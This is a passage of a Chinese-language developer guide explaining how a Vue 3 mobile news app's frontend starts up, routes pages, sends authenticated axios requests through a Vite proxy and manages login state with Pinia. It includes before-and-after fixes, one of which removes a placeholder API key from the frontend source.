# 前端完全详解（Frontend Guide）

> 本文档面向「想搞懂这个前端是怎么运转的」读者。
> 按**从启动到渲染**的顺序逐步拆解：入口初始化 → 路由导航 → 状态管理 → 请求链路 → 页面渲染 → AI 对话。
>
> 配套文档：`BACKEND_GUIDE.md`（后端详解）、`README.md`（快速上手）、`CHANGES.md`（改动记录）

---

## 目录

- [第 0 步：技术栈与目录结构](#第-0-步技术栈与目录结构)
- [第 1 步：程序是怎么启动起来的](#第-1-步程序是怎么启动起来的)
- [第 2 步：根组件与全局布局](#第-2-步根组件与全局布局)
- [第 3 步：路由系统](#第-3-步路由系统)
- [第 4 步：统一的请求层（http.js）](#第-4-步统一的请求层httpjs)
- [第 5 步：状态管理 Pinia](#第-5-步状态管理-pinia)
- [第 6 步：登录注册流程](#第-6-步登录注册流程)
- [第 7 步：首页与新闻列表](#第-7-步首页与新闻列表)
- [第 8 步：新闻详情页](#第-8-步新闻详情页)
- [第 9 步：收藏与浏览历史](#第-9-步收藏与浏览历史)
- [第 10 步：AI 对话页（核心）](#第-10-步ai-对话页核心)
- [第 11 步：国际化与主题](#第-11-步国际化与主题)
- [第 12 步：一次交互的完整数据流](#第-12-步一次交互的完整数据流)
- [第 13 步：构建与部署](#第-13-步构建与部署)
- [附录：常用调试技巧](#附录常用调试技巧)

---

## 第 0 步：技术栈与目录结构

### 用了什么，为什么用它

| 技术 | 版本 | 作用 | 为什么选它 |
|---|---|---|---|
| **Vue 3** | 3.5 | UI 框架 | 组合式 API + `<script setup>` 写起来最简洁 |
| **Vite** | 7.2 | 构建工具 | 启动秒级，HMR 热更新几乎无感 |
| **Vant 4** | 4.9 | 移动端组件库 | 组件齐全，风格统一，省去自己写轮播/表单/弹窗 |
| **Pinia** | 3.0 | 状态管理 | Vue 官方推荐，比 Vuex 简单很多 |
| **Vue Router** | 4.5 | 路由 | 官方方案 |
| **axios** | 1.12 | HTTP 请求 | 拦截器机制好用 |
| **marked** | 16.4 | Markdown 解析 | AI 回复需要渲染 Markdown |
| **DOMPurify** | 3.2 | HTML 消毒 | 渲染 HTML 前必须防 XSS |
| **vue-i18n** | 9.14 | 国际化 | 中英双语 |
| **pinia-plugin-persistedstate** | 4.7 | 状态持久化 | 刷新页面保持登录状态 |

### 目录结构

```
xwzx-news/
│
├── index.html                 ← 【唯一 HTML】Vue 挂载点
├── vite.config.js             ← 【构建配置】含 /api 开发代理
├── package.json               ← 依赖与脚本
├── .env.example               ← 环境变量模板
│
└── src/
    ├── main.js                ← 【入口】创建应用、注册组件、挂载
    ├── App.vue                ← 【根组件】keep-alive 路由容器
    ├── style.css              ← 【全局样式】CSS 变量、滚动条、动画
    │
    ├── config/
    │   ├── api.js             ← 接口地址常量（不含任何密钥）
    │   └── http.js            ← 【请求层】统一 axios 实例
    │
    ├── router/
    │   └── index.js           ← 【路由表】11 个页面的路径与元信息
    │
    ├── store/                 ← 【状态管理】
    │   ├── index.js           ← Pinia 实例 + 持久化插件
    │   ├── user.js            ← 用户状态（登录、资料、密码）
    │   ├── theme.js           ← 主题（4 套配色）
    │   ├── language.js        ← 语言（中/英）
    │   └── modules/
    │       ├── news.js        ← 新闻（分类、列表、详情）
    │       ├── favorite.js    ← 收藏
    │       └── history.js     ← 浏览历史
    │
    ├── i18n/
    │   ├── index.js           ← i18n 实例
    │   └── locales/
    │       ├── zh-CN.js       ← 中文语言包
    │       └── en-US.js       ← 英文语言包
    │
    ├── components/            ← 【可复用组件】
    │   ├── NewsItem.vue       ← 单条新闻卡片
    │   └── TabBar.vue         ← 底部导航栏
    │
    └── views/                 ← 【页面】（一个文件 = 一个路由）
        ├── Home.vue           ← 首页（分类 + 列表）
        ├── NewsDetail.vue     ← 新闻详情
        ├── Category.vue       ← 全部分类
        ├── AIChat.vue         ← AI 对话 ★ 核心
        ├── Login.vue          ← 登录
        ├── Register.vue       ← 注册
        ├── My.vue             ← 我的
        ├── Profile.vue        ← 个人信息
        ├── Favorite.vue       ← 我的收藏
        ├── History.vue        ← 浏览历史
        └── Settings.vue       ← 设置
```

### 分层关系

```
        views/（页面）           ← 只负责「显示什么」和「用户点了什么」
           │  调用
           ▼
        store/（状态）           ← 负责「数据从哪来、存在哪」
           │  调用
           ▼
        config/http.js（请求）    ← 负责「怎么发请求、token 怎么带、错误怎么处理」
           │  HTTP
           ▼
        后端 API
```

**铁律：页面组件里不直接写 `axios`，也不拼 URL。** 全部通过 store → http.js。

---

## 第 1 步：程序是怎么启动起来的

### 唯一的 HTML 文件：`index.html`

```html
<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/svg+xml" href="/vite.svg" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
    <title>新闻资讯</title>
  </head>
  <body>
    <div id="app"></div>
    <script type="module" src="/src/main.js"></script>
  </body>
</html>
```

逐个讲：

```html
<meta name="viewport" content="width=device-width, initial-scale=1.0,
      maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
```

这是移动端适配的关键：

| 属性 | 作用 |
|---|---|
| `width=device-width` | 页面宽度 = 设备宽度（不是固定的 980px） |
| `initial-scale=1.0` | 初始不缩放 |
| `maximum-scale=1.0` + `user-scalable=no` | 禁止双指缩放（模拟原生 App 手感） |
| `viewport-fit=cover` | 允许内容延伸到 iPhone 刘海/底部横条区域 |

```html
<div id="app"></div>
```

**整个应用最终会被渲染到这个 div 里。** 这是 Vue 的挂载点。

```html
<script type="module" src="/src/main.js"></script>
```

`type="module"` 让浏览器按 ES Module 规范加载，
Vite 会处理其中的 `import` 语句。这是整个应用的**入口**。

### 入口文件：`src/main.js`（91 行）

```javascript
import { createApp } from 'vue'
import App from './App.vue'
import router from './router'
import pinia from './store'
```

**导入顺序其实就是依赖顺序**：先有 Vue，再有根组件，再有路由和状态。

```javascript
// 导入Vant组件库
import {
  Button, NavBar, Tabbar, TabbarItem, Tab, Tabs, List, PullRefresh,
  Cell, CellGroup, Grid, GridItem, Empty, Form, Field,
  Image as VanImage, Icon, Popup, Radio, RadioGroup, Dialog, Loading, Divider,
} from 'vant'

// 导入Vant样式
import 'vant/lib/index.css'
```

**注意 `Image as VanImage`** —— 这里用了重命名导入。
因为 `Image` 是浏览器的全局构造函数，直接叫 `Image` 会覆盖它，容易出问题。

**为什么会漏注册组件？** 这是改造前的一个真实 bug：

```javascript
// 改造前（有问题）
app.use(Button); app.use(NavBar); app.use(Tabbar); ...
app.use(Popup)
// ❌ 没有 Dialog、Radio、RadioGroup
// ❌ 却有 app.use(Toast) —— Toast 是函数式 API，不是插件，这行无效
```

后果：`Settings.vue` 里写的 `<van-radio-group>` 和 `<van-radio>` 没被注册，
Vue 把它们当成普通 HTML 标签，**语言选择弹窗渲染不出来**。

改造后改成数组遍历，并把缺失的补上：

```javascript
const vantComponents = [
  Button, NavBar, Tabbar, TabbarItem, Tab, Tabs, List, PullRefresh,
  Cell, CellGroup, Grid, GridItem, Empty, Form, Field,
  VanImage, Icon, Popup, Radio, RadioGroup, Dialog, Loading, Divider,
]

vantComponents.forEach((component) => app.use(component))
```

**为什么不干脆 `app.use(Vant)` 全量注册？**
全量注册会把所有组件都打进包里，体积从 200KB 涨到 1MB+。
按需注册只引入用到的 23 个组件，包体积小很多。

> 📌 补充：**`showToast` / `showDialog` 这类函数式 API 不需要注册**，
> 用的时候直接 `import { showToast } from 'vant'` 即可。
> 只有模板里当标签用的组件（`<van-button>`）才需要 `app.use`。

```javascript
const app = createApp(App)
const i18n = setupI18n()
app.use(i18n)
```

`app.use()` 是 Vue 的插件安装机制。i18n 装上后，
所有组件里都能用 `$t('key')` 或 `useI18n()` 取翻译。

```javascript
// 使用路由和状态管理
app.use(router)
app.use(pinia)

// 初始化主题
import { useThemeStore } from './store/theme'
const themeStore = useThemeStore()
themeStore.initTheme()

app.mount('#app')
```

**⚠️ 这里有顺序讲究，改造前是错的：**

```javascript
// 改造前（有问题）
app.mount('#app')                          // ← 先挂载
import { useThemeStore } from './store/theme'
const themeStore = useThemeStore()          // ← 再初始化主题
themeStore.initTheme()
```

两个问题：
1. **挂载后再改主题** → 用户会看到一瞬间的白色，然后才变成暗色（闪烁）
2. `import` 写在文件中间虽然语法允许（会被提升到顶部），但可读性差

改到 `mount` 之前执行，主题变量在首次渲染前就设置好了。

**`useThemeStore()` 必须在 `app.use(pinia)` 之后调用** ——
因为 store 依赖 Pinia 实例，Pinia 没装上就调用会报错。

### 完整启动时序

```
① 浏览器请求 http://127.0.0.1:5173/
② Vite 返回 index.html
③ 浏览器解析到 <script type="module" src="/src/main.js">
④ 请求 main.js，Vite 实时编译并返回
⑤ main.js 的 import 语句递归加载所有依赖
   （App.vue → router → 各页面组件 → store → http.js）
⑥ 执行 createApp(App) 创建应用实例
⑦ app.use(i18n)     安装国际化
⑧ app.use(router)   安装路由
⑨ app.use(pinia)    安装状态管理
⑩ useThemeStore() + initTheme()
   └─ 读 localStorage 里的主题
   └─ 设置 CSS 变量 --background-color 等
⑪ app.mount('#app')
   └─ 渲染 App.vue
   └─ App.vue 里的 <router-view> 根据当前 URL 渲染对应页面
```

---

## 第 2 步：根组件与全局布局

### `src/App.vue`（45 行）

```vue
<template>
  <div class="app">
    <router-view v-slot="{ Component }">
      <template v-if="$route.meta.keepAlive">
        <keep-alive>
          <component :is="Component" />
        </keep-alive>
      </template>
      <template v-else>
        <component :is="Component" />
      </template>
    </router-view>
  </div>
</template>

<script setup>
// App.vue 作为根组件
</script>
```

**`<router-view v-slot="{ Component }">` 在做什么？**

普通用法是 `<router-view />`，它会直接渲染匹配到的页面组件。
但这里需要根据条件决定"是否缓存"，所以用**作用域插槽**把组件对象取出来手动渲染。

```vue
<keep-alive>              <!-- 缓存：组件切换时保留状态，不销毁 -->
  <component :is="Component" />   <!-- 动态组件：渲染传进来的组件对象 -->
</keep-alive>
```

**`keep-alive` 解决什么问题？**

假设你在首页向下滚动了 10 屏，点进一条新闻，再返回首页：

| | 不用 keep-alive | 用 keep-alive |
|---|---|---|
| 首页组件状态 | **被销毁**，列表数据清空 | 保留 |
| 返回后 | 重新请求数据、滚动位置回到顶部 | 数据还在、位置不变 |
| 体验 | 像重新打开 App | 像退出了一个弹窗 |

哪些页面缓存？由路由的 `meta.keepAlive` 决定：

```javascript
{ path: '/home',   meta: { title: '首页',    keepAlive: true  } },  // 缓存
{ path: '/aichat', meta: { title: 'AI问答',  keepAlive: true  } },  // 缓存（对话记录保留）
{ path: '/login',  meta: { title: '登录',    keepAlive: false } },  // 不缓存
{ path: '/news/detail/:id', meta: { title: '新闻详情', keepAlive: false } },  // 不缓存
```

**为什么详情页不缓存？** 因为不同新闻共用同一个组件。
如果缓存了，从新闻 A 进新闻 B 时会先显示 A 的旧内容再刷新，体验很怪。

### 全局样式：`src/style.css`

```css
:root {
  /* 主题变量 */
  --primary-color: #1989fa;
  --text-color: #333;
  --text-color-light: #666;
  --text-color-lighter: #999;
  --border-color: #ebedf0;
  --background-color: #f7f8fa;
  --white: #fff;
  --safe-area-inset-bottom: env(safe-area-inset-bottom);
  ...
}
```

**CSS 变量（自定义属性）是主题切换的基础。**
所有页面里写的都是 `background-color: var(--background-color)`，
切换主题时只需要改 `:root` 上的变量值，**所有页面瞬间变色**，
不用一个个组件去改。

```css
/* 适配iPhone底部安全区域 */
.van-tabbar {
  padding-bottom: var(--safe-area-inset-bottom);
}
```

iPhone X 以后的机型底部有一条"横条"（Home Indicator）。
如果不留出这段空间，底部导航栏会被横条盖住。
`env(safe-area-inset-bottom)` 是浏览器提供的安全区高度（非刘海屏上是 0）。

```css
/* 文本溢出省略号 */
.ellipsis {
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}

.ellipsis-2 {
  display: -webkit-box;
  -webkit-box-orient: vertical;
  -webkit-line-clamp: 2;
  line-clamp: 2;
  overflow: hidden;
}
```

- `.ellipsis`：单行溢出显示 `...`
- `.ellipsis-2`：**多行**溢出显示 `...`

`-webkit-line-clamp: 2` 是限制显示 2 行的关键，配合 `-webkit-box` 使用。
新闻标题和摘要都用它，保证卡片高度整齐。

### `src/App.vue` 里的样式

```css
.app {
  max-width: 750px;
  margin: 0 auto;
  height: 100%;
}
```

`max-width: 750px` + `margin: 0 auto` 让页面在**桌面浏览器上也居中显示成手机宽度**，
而不是拉伸成整个屏幕。这是移动端项目常见的做法。

```css
/* 移动端适配 */
@media screen and (max-width: 750px) {
  html {
    font-size: calc(100vw / 750 * 16);
  }
}
```

这是 **rem 适配方案**：让 `1rem` 永远等于"屏幕宽度的 1/750 × 16"。
设计稿按 750px 宽度做，元素尺寸用 rem 写，就能在不同宽度的手机上等比缩放。

> 📌 注意：本项目实际上大量使用了 `px` 而非 `rem`，
> 所以这段适配的作用有限。改成 rem 会有更好的多机型适配效果，
> 但会改变现有视觉比例 —— 鉴于"UI 不能变"的要求，本次未做改动。

---

## 第 3 步：路由系统

### `src/router/index.js`（119 行）

```javascript
import { createRouter, createWebHistory } from 'vue-router'

const routes = [
  { path: '/', redirect: '/home' },
  { path: '/login',    name: 'Login',    component: () => import('../views/Login.vue'),    meta: { title: '登录',     keepAlive: false } },
  { path: '/register', name: 'Register', component: () => import('../views/Register.vue'), meta: { title: '注册',     keepAlive: false } },
  { path: '/home',     name: 'Home',     component: () => import('../views/Home.vue'),     meta: { title: '首页',     keepAlive: true  } },
  { path: '/news/detail/:id', name: 'NewsDetail', component: () => import('../views/NewsDetail.vue'), meta: { title: '新闻详情', keepAlive: false } },
  { path: '/history',  name: 'History',  component: () => import('../views/History.vue'),  meta: { title: '浏览历史', keepAlive: false } },
  { path: '/favorite', name: 'Favorite', component: () => import('../views/Favorite.vue'), meta: { title: '我的收藏', keepAlive: false } },
  { path: '/category', name: 'Category', component: () => import('../views/Category.vue'), meta: { title: '分类',     keepAlive: true  } },
  { path: '/aichat',   name: 'AIChat',   component: () => import('../views/AIChat.vue'),   meta: { title: 'AI问答',   keepAlive: true  } },
  { path: '/my',       name: 'My',       component: () => import('../views/My.vue'),       meta: { title: '我的',     keepAlive: true  } },
  { path: '/profile',  name: 'Profile',  component: () => import('../views/Profile.vue'),  meta: { title: '个人信息', keepAlive: false } },
  { path: '/settings', name: 'Settings', component: () => import('../views/Settings.vue'), meta: { title: '设置',     keepAlive: false } },
]
```

### 关键点一：路由懒加载

```javascript
component: () => import('../views/Login.vue')
//           └─ 返回一个函数，只有真正访问这个路由时才去加载
```

对比两种写法：

```javascript
// ❌ 静态导入：应用启动时就把 11 个页面全部下载
import Login from '../views/Login.vue'

// ✅ 动态导入：访问 /login 时才下载 Login.vue
component: () => import('../views/Login.vue')
```

构建产物可以验证效果 —— 每个页面都被切成了独立的 chunk：

```
dist/assets/Home-Duyp2oon.js          3.30 kB
dist/assets/NewsDetail-BxaVZs5Z.js    3.17 kB
dist/assets/AIChat-DqDiItkX.js       66.12 kB   ← AI 页含 marked+dompurify，最大
dist/assets/index-DNtOddOm.js       247.60 kB   ← 公共部分（Vue+Vant+Router）
```

**首屏只需要下载 `index.js` + `Home.js`，不用等 AI 页那 66KB。**
这就是懒加载的价值 —— 首屏更快。

### 关键点二：动态路由参数

```javascript
{ path: '/news/detail/:id', ... }
```

`:id` 是**路由参数**，访问 `/news/detail/45` 时，
组件里可以这样拿到：

```javascript
const route = useRoute()
const newsId = computed(() => Number(route.params.id))   // 45
```

**为什么用 `computed` 而不是直接取？**
因为路由参数变化时组件会被复用（不重新创建）。
用 `computed` 能保证参数变化后自动更新。

### 关键点三：`createWebHistory` vs `createWebHashHistory`

```javascript
const router = createRouter({
  history: createWebHistory(import.meta.env.BASE_URL),
  routes
})
```

| | URL 形式 | 需要服务端配合 |
|---|---|---|
| `createWebHistory` | `example.com/news/detail/1` | ✅ 需要 SPA 回退配置 |
| `createWebHashHistory` | `example.com/#/news/detail/1` | ❌ 不需要 |

本项目用的是 **History 模式**（URL 更干净），
所以后端必须做 SPA 回退 —— 这就是 `BACKEND_GUIDE.md` 第 14 步里那段
`build_spa_error_handler` 存在的原因。两者是配套的。

`import.meta.env.BASE_URL` 默认是 `/`，如果在子路径部署（如 `example.com/app/`），
可以在 Vite 配置里改 `base`。

### 关键点四：全局前置守卫

```javascript
router.beforeEach((to, from, next) => {
  // 设置页面标题
  document.title = to.meta.title || '新闻资讯'
  // 直接允许访问所有页面
  next()
})
```

`beforeEach` 是**每次路由切换前**都会执行的钩子。这里做了一件事：
把 `meta.title` 写到 `document.title`，让浏览器标签页显示"首页"、"新闻详情"等。

`next()` 是必须调用的，表示"放行"。
如果不调用，导航会一直挂起（页面卡住不动）。

**为什么没做登录拦截？**

```javascript
// 注意这里是"直接允许访问所有页面"
next()
```

因为在**移动端 App 风格的产品**里，未登录也应该能浏览新闻。
需要登录的操作（收藏、查看历史）在页面内单独判断并弹提示跳转，
这样比"一进 App 就强制登录"的体验好得多：

```javascript
// NewsDetail.vue
const toggleFavorite = async () => {
  if (!userStore.getLoginStatus) {
    showToast({ message: '请先登录后再收藏', position: 'bottom' })
    router.push('/login')
    return
  }
  ...
}
```

### 底部导航栏：`src/components/TabBar.vue`

```vue
<template>
  <van-tabbar v-model="active" route>
    <van-tabbar-item to="/home" icon="home-o">{{ $t('nav.home') }}</van-tabbar-item>
    <van-tabbar-item to="/aichat" icon="chat-o">{{ $t('nav.aiChat') }}</van-tabbar-item>
    <van-tabbar-item to="/my" icon="user-o">{{ $t('nav.my') }}</van-tabbar-item>
  </van-tabbar>
</template>

<script setup>
import { ref } from 'vue'
import { useRoute } from 'vue-router'

const route = useRoute()
const active = ref(0)

const setActiveTab = () => {
  const path = route.path
  if (path.includes('/home'))        active.value = 0
  else if (path.includes('/aichat')) active.value = 1
  else if (path.includes('/my'))     active.value = 2
}

setActiveTab()
</script>
```

- `route` 属性：开启路由模式，点击 item 自动跳转到 `to` 指定的路径
- `setActiveTab()`：根据当前路径高亮对应的图标
- `$t('nav.home')`：国际化翻译（"首页" / "Home"）

**这个组件在 5 个页面里被复用**（Home、AIChat、My、Category 等），
这正是组件化的价值 —— 改一处，所有页面同步更新。

---

## 第 4 步：统一的请求层（http.js）

### 改造前的混乱

```javascript
// store/user.js、store/modules/news.js、favorite.js、history.js
// 每个文件都这样写：
import axios from 'axios'
import { apiConfig } from '../config/api'

const response = await axios.post(`${apiConfig.baseURL}/api/user/login`, {...}, {
  headers: { Authorization: userStore.token }    // ← 每个方法都要手写
})
if (response.data && response.data.code === 200) {   // ← 每个方法都要判断
  ...
}
```

四个 store、二十多个方法，每处都要：
1. 手拼完整 URL（`${baseURL}/api/...`）—— 地址改了要改二十处
2. 手写 `Authorization` 头 —— 漏写一处就 401
3. 手判 `response.data.code` —— 到处重复

### 改造后：`src/config/api.js`

```javascript
export const apiConfig = {
  // 留空 = 使用当前站点（开发时由 vite.config.js 的 proxy 转发到后端）
  baseURL: import.meta.env.VITE_API_BASE_URL || '',
  timeout: 15000,
}

export const aiChatConfig = {
  streamEndpoint: '/api/AIchat/chat/stream',   // 流式对话
  chatEndpoint:   '/api/AIchat/chat',          // 非流式
  configEndpoint: '/api/AIchat/config',        // 探测可用性
}
```

**⚠️ 重要：这个文件里已经没有任何 API Key 了。**

改造前是这样的：

```javascript
// ❌ 改造前
export const aiChatConfig = {
  apiEndpoint: 'https://dashscope.aliyuncs.com/compatible-mode/v1/chat/completions',
  apiKey: 'sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx',   // ← 密钥写在前端源码里！
  model: 'qwen3-max-preview'
}
```

这段代码打包后会进入 `dist/assets/*.js`，任何人下载网站资源就能看到密钥。
现在前端只请求自己的后端，密钥在服务端 `.env` 里。

**为什么 `baseURL` 留空？**

```javascript
baseURL: ''   // → 请求 http://127.0.0.1:5173/api/news/list
              //   Vite 代理再转发到 http://127.0.0.1:8000/api/news/list
```

- **同源请求，没有跨域问题**（浏览器认为自己在请求自己）
- 部署到生产时前后端同端口，同样不用改代码
- 需要分开部署时，设 `VITE_API_BASE_URL` 即可，不用改代码

### 改造后：`src/config/http.js`（46 行）

```javascript
import axios from 'axios'
import { apiConfig } from './api'

const http = axios.create({
  baseURL: apiConfig.baseURL,
  timeout: apiConfig.timeout,
})
```

`axios.create()` 创建一个**带默认配置的实例**。
之后所有请求都走这个实例，默认配置自动生效。

#### 请求拦截器：自动带上 token

```javascript
function readToken() {
  const direct = localStorage.getItem('user-token')
  if (direct) return direct

  try {
    const persisted = JSON.parse(localStorage.getItem('user-store') || '{}')
    return persisted.token || ''
  } catch (e) {
    return ''
  }
}

http.interceptors.request.use((config) => {
  const token = readToken()
  if (token) {
    config.headers = config.headers || {}
    config.headers.Authorization = `Bearer ${token}`
  }
  return config
})
```

**拦截器在做什么？** 每个请求发出**之前**，自动执行这段代码，
把 token 塞到请求头里。于是业务代码里再也不用写 `headers: { Authorization: ... }`。

**`readToken()` 为什么要读两个地方？**

这是解决一个时序问题的：

```
页面刷新时的顺序：
① localStorage 里有持久化的 user-store（包含 token）
② Pinia 从 localStorage 恢复状态
③ 组件 onMounted 里发请求

问题：如果某些代码在 ② 之前就发了请求，
     userStore.token 还是空的，但 localStorage 里其实有。
```

所以：
- 优先读 `user-token`（登录时主动写入的独立 key，最快）
- 读不到再从 `user-store`（Pinia 持久化的完整状态）里兜底

**为什么要 `try/catch`？** `JSON.parse` 遇到损坏的数据会抛异常。
如果这里抛了，整个请求就发不出去。
用 try/catch 保证"持久化数据坏了也不影响发请求"。

#### 响应拦截器：统一错误处理

```javascript
http.interceptors.response.use(
  (response) => response.data,          // ① 成功：直接把 data 剥出来
  (error) => {                          // ② 失败：整理错误信息
    const body = error.response?.data
    const message =
      body?.message ||                  // 后端的统一格式
      body?.detail ||                   // FastAPI 原生格式
      (error.code === 'ECONNABORTED'
        ? '请求超时，请稍后重试'
        : '网络异常，请确认后端服务已启动')
    error.friendlyMessage = message     // ③ 挂到 error 对象上
    return Promise.reject(error)
  },
)
```

**① `(response) => response.data` 这一行很关键。**

axios 默认返回的对象是这样的：

```javascript
{
  data: { code: 200, message: '...', data: {...} },   // 后端返回的 JSON
  status: 200,
  statusText: 'OK',
  headers: {...},
  config: {...}
}
```

所以业务代码要写 `response.data.code`。
拦截器里直接 `return response.data` 之后，业务代码变成 `response.code`，省一层。

**② 错误信息的三个来源**（按优先级）：

| 来源 | 何时出现 | 示例 |
|---|---|---|
| `body.message` | 后端的统一异常处理器 | `"用户名或密码错误"` |
| `body.detail` | FastAPI 原生校验错误 | `"Field required"` |
| 本地兜底 | 网络断了 / 超时 | `"网络异常，请确认后端服务已启动"` |

**③ `error.friendlyMessage` 是什么？**

把整理好的中文提示挂到 error 对象上，
这样业务层可以统一这样写：

```javascript
catch (error) {
  return { success: false, message: error.friendlyMessage || '操作失败' }
}
```

而不用在每个 catch 里重复写 `error.response?.data?.message || ...`。

### 使用方式对比

```javascript
// ❌ 改造前
import axios from 'axios'
const response = await axios.post(
  `${apiConfig.baseURL}/api/user/login`,
  { username, password },
  { headers: { Authorization: userStore.token } }
)
if (response.data && response.data.code === 200) {
  const userInfo = response.data.data.userInfo
  ...
}

// ✅ 改造后
const response = await http.post('/api/user/login', { username, password })
if (response && response.code === 200) {
  const userInfo = response.data.userInfo      // ← 少一层 .data
  ...
}
```

### Vite 代理配置：`vite.config.js`

```javascript
export default defineConfig(({ mode }) => {
  const env = loadEnv(mode, process.cwd(), '')
  const target = env.VITE_PROXY_TARGET || 'http://127.0.0.1:8000'

  return {
    plugins: [vue()],
    server: {
      port: 5173,
      proxy: {
        '/api': {
          target,
          changeOrigin: true,
          // SSE（AI 流式对话）必须关闭缓冲，否则会「一次性吐出全部内容」
          configure: (proxy) => {
            proxy.on('proxyRes', (proxyRes) => {
              if (proxyRes.headers['content-type']?.includes('text/event-stream')) {
                delete proxyRes.headers['content-length']
              }
            })
          },
        },
        '/health': { target, changeOrigin: true },
      },
    },
    build: {
      outDir: 'dist',
      sourcemap: false,
      chunkSizeWarningLimit: 1500,
    },
  }
})
```

**代理的工作原理：**

```
浏览器请求 http://127.0.0.1:5173/api/news/list
                     ↓
        Vite 开发服务器拦截 /api 开头的请求
                     ↓
        转发到 http://127.0.0.1:8000/api/news/list
                     ↓
        后端返回数据，Vite 原样回给浏览器
```

从浏览器的角度看，请求的是**同一个源**（5173），所以**不触发跨域检查**。

**为什么 SSE 要删掉 `content-length`？**

流式响应没有固定长度（内容边生成边发）。
`content-length` 头会告诉浏览器"总共就这么长"，导致浏览器要等全部收完才处理。
删掉它，浏览器就会用 `Transfer-Encoding: chunked` 逐块处理 —— 这才是真正的流式。

**`sourcemap: false`** —— 生产构建不生成 sourcemap，
体积更小，也不会把源码暴露给用户。
`chunkSizeWarningLimit: 1500` 是把警告阈值从默认 500KB 提到 1500KB，
因为 `index.js` 有 247KB，用默认值会一直报警告。

---

## 第 5 步：状态管理 Pinia

### 为什么需要状态管理

假设不用 Pinia，用户信息会怎么传？

```
Login.vue 拿到用户信息
   ↓ 需要传给
Home.vue（显示头像）  →  props 层层传递 / 事件层层冒泡
AIChat.vue（可能需要）
My.vue（显示用户名）
Profile.vue（显示资料）
   ↓ 任何一个页面修改了信息
其它页面怎么知道要更新？
```

**Pinia 就是解决这个问题的全局仓库**：任何组件都能读写，
数据变化所有用到它的组件自动更新。

### Pinia 实例与持久化插件：`src/store/index.js`

```javascript
import { createPinia } from 'pinia'
import piniaPluginPersistedstate from 'pinia-plugin-persistedstate'

const pinia = createPinia()

// pinia-plugin-persistedstate v4：直接 use 默认导出即可
// （v3 的 createPersistedState({ storage }) 写法在 v4 里已废弃）
pinia.use(piniaPluginPersistedstate)

export default pinia
```

#### ⚠️ 这是一个真实踩到的版本坑

项目装的是 `pinia-plugin-persistedstate@4.7.1`，但改造前的代码用的是 v3 的 API：

```javascript
// ❌ 改造前
import { createPersistedState } from 'pinia-plugin-persistedstate'
pinia.use(createPersistedState({ storage: localStorage }))
```

```javascript
// ❌ 改造前 store/user.js
persist: {
  enabled: true,                                        // v3 选项
  strategies: [{ key: 'user-store', storage: localStorage }]   // v3 选项，v4 已移除
}
```

v4 里 `strategies` 这个选项**被彻底删除了**，配置结构完全变了。
结果是**登录状态实际上没有被正确持久化** —— 刷新页面就掉登录。

改造后：

```javascript
// ✅ v4 写法：全局插件
pinia.use(piniaPluginPersistedstate)
```

```javascript
// ✅ v4 写法：store 内配置
persist: {
  key: 'user-store',
  pick: ['userInfo', 'token', 'isLogin'],   // 只持久化这三个字段
}
```

**`pick` 为什么重要？**

store 里除了 `state`，还有 `getters` 和 `actions`（一堆函数）。
如果全部序列化写进 localStorage：
- 函数没法序列化，会被丢掉（浪费空间）
- 数据变多后每次读写都变慢

`pick` 明确指定只存这三个字段，干净且高效。

### 用户 store：`src/store/user.js`（143 行）

```javascript
export const useUserStore = defineStore('user', {
  state: () => ({
    userInfo: null,
    token: '',
    isLogin: false,
    userBio: '这是我的个人简介',
  }),

  getters: {
    getUserInfo: (state) => state.userInfo,
    getToken: (state) => state.token,
    getLoginStatus: (state) => state.isLogin,
    getUserBio: (state) => state.userInfo?.bio || state.userBio,
  },
  ...
})
```

三个概念：

| 概念 | 类比 | 说明 |
|---|---|---|
| `state` | 数据 | 组件的 `data`，响应式的 |
| `getters` | 计算属性 | 组件的 `computed`，基于 state 派生 |
| `actions` | 方法 | 组件的 `methods`，可以异步 |

`getUserBio` 里的 `?.` 是**可选链**：如果 `userInfo` 是 `null`，
`state.userInfo?.bio` 返回 `undefined` 而不会抛错，然后 `|| state.userBio` 给默认值。

#### 抽取公共的登录写入逻辑

```javascript
setAuth(data) {
  this.userInfo = data.userInfo
  this.token = data.token
  this.isLogin = true
  localStorage.setItem('user-token', data.token)    // ← 额外写一份
},
```

**为什么要额外写 `user-token`？**

因为 Pinia 的持久化是**异步/延迟**的（在 state 变化后才写入 localStorage）。
而 `http.js` 的拦截器可能在持久化完成前就发请求了。
主动写一个独立的 key，让拦截器立刻就能读到。

#### 登录 action

```javascript
async login(userData) {
  try {
    const response = await http.post('/api/user/login', {
      username: userData.username,
      password: userData.password,
    })

    if (response && response.code === 200) {
      this.setAuth(response.data)
      return { success: true, message: '登录成功' }
    }
    return { success: false, message: response?.message || '登录失败' }
  } catch (error) {
    return {
      success: false,
      message: error.friendlyMessage || '登录请求失败，请稍后再试',
    }
  }
},
```

**注意这里的设计：action 不抛异常，而是返回 `{ success, message }`。**

为什么不直接 `throw`？因为调用方（Login.vue）需要区分三种情况：
1. 成功 → 跳转首页 + 绿色提示
2. 业务失败（密码错）→ 红色提示，留在当前页
3. 网络失败 → 红色提示

如果抛异常，调用方要写 `try/catch` 才能区分。
返回结构化的结果对象，调用方一个 `if` 就够了：

```javascript
// Login.vue
const result = await userStore.login({ username: username.value, password: password.value })
if (result.success) {
  showToast({ type: 'success', message: result.message })
  router.push('/')
} else {
  showToast({ type: 'fail', message: result.message })
}
```

#### Token 过期自动登出

```javascript
async getUserInfoDetail() {
  if (!this.token) {
    return { success: false, message: '未登录' }
  }

  try {
    const response = await http.get('/api/user/info')
    ...
  } catch (error) {
    // 令牌失效时自动登出，避免界面卡在「已登录」状态
    if (error.response?.status === 401) {
      this.logout()
    }
    return { success: false, message: error.friendlyMessage || '...' }
  }
},
```

**这是改造新增的逻辑。** 之前的问题是：
token 在服务端过期了（7 天），但前端 localStorage 里还有，
`isLogin` 依然是 `true`，界面显示"已登录"，点什么都失败，用户完全不知道发生了什么。

现在收到 401 就自动清空状态，用户会看到"未登录"并被引导去登录。

**这也依赖后端的一个修复** —— `utils/auth.py` 里把缺失 token 的响应
从 422 改成了 401（详见 `BACKEND_GUIDE.md` 第 9 步）。
前后端必须约定一致的状态码，这个自动登出才能生效。

#### 退出登录

```javascript
